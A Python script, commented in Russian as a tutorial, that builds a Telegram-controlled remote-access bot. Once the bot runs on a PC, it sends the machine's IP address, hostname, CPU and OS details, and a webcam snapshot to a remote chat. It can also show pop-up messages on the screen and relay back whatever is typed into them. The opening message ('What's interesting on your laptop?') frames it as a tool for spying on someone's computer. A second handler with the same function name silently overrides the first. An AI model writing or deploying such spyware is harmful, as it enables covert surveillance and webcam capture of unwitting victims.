#устанавливаем через pip библиотеки и импортируем их
import platform as pf  #  для хар-ки ПК
import cv2  # pip install opencv-python, для изображения с веб-камеры
import pyautogui as pag   # выодит текст,скрин, взаимодейст с ПК
import requests  # pip install requests , ip адрес
import telebot
from telebot import types

TOKEN = ""  # Вписываем токен каторый можно взять в телеграмм у BotFather
CHAT_ID = " "  # запрашиваем в телеграмм у @ShowJsonBot
client = telebot.TeleBot(TOKEN)
requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Что там интересного у тебя на ноуте?")  # выводит в телеграм когда пишем боту


@client.message_handler(commands=["start"]) # активирует кнопки
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/ip", "/spec", "/webcam", "/message", "/input"]  # перечесляем функции

    for btn in btns:
        rmk.add(types.KeyboardButton(btn))  # в цикле перебираем кнопки и добавляем в нашу клав.

    client.send_message(message.chat.id, "Выберите действие:", reply_markup=rmk) # вывели сообщение с кнопками


@client.message_handler(commands=["ip", "ip_address"])
def ip_address(message):
   response = requests.get("http://jsonip.com/").json() # с помощью ссылки выводится ip
   client.send_message(message.chat.id, f"IP Address: {response['ip']}")


@client.message_handler(commands=["spec", "specifications"]) # можно добавлять много  названий команд
def spec(message):
    msg = f"Name PC: {pf.node()}\nProcessor: {pf.processor()}\nSystem: {pf.system()} {pf.release()}" # пользуемся библиотекой платформ
    client.send_message(message.chat.id, msg)


@client.message_handler(commands=["webcam"])
def webcam(message):
    cap = cv2.VideoCapture(0) # создаем веб кам

    for i in range(30):
        cap.read()

    ret, frame = cap.read() # вывод и раздел списка

    cv2.imwrite("cam.jpg", frame)
    cap.release()

    with open("cam.jpg", "rb") as img:
        client.send_photo(message.chat.id, img) # вывели изображение с веб


@client.message_handler(commands=["message"])
def message_sending(message):
   msg = client.send_message(message.chat.id, "Введите ваше сообщение, которое желаете вывести на экран.")
   client.register_next_step_handler(msg, next_message_sending) # пошаговый обработчик

def next_message_sending(message): # обработка отправленного текста
   try:
      pag.alert(message.text, "Message")
   except Exception:
      client.send_message(message.chat.id, "Что-то пошло не так...") # главный текст и окно

@client.message_handler(commands=["input"])
def message_sending_with_input(message):
	msg = client.send_message(message.chat.id, "Введите сообщение:")
	client.register_next_step_handler(msg, next_message_sending)


def next_message_sending(message):
	try:
		answer = pag.prompt(message.text, "~") # с помощью промт может отправлять и получать текст
		client.send_message(message.chat.id, answer)
	except Exception:
		client.send_message(message.chat.id, "Что-то пошло не так...")


client.polling() #запуск кода
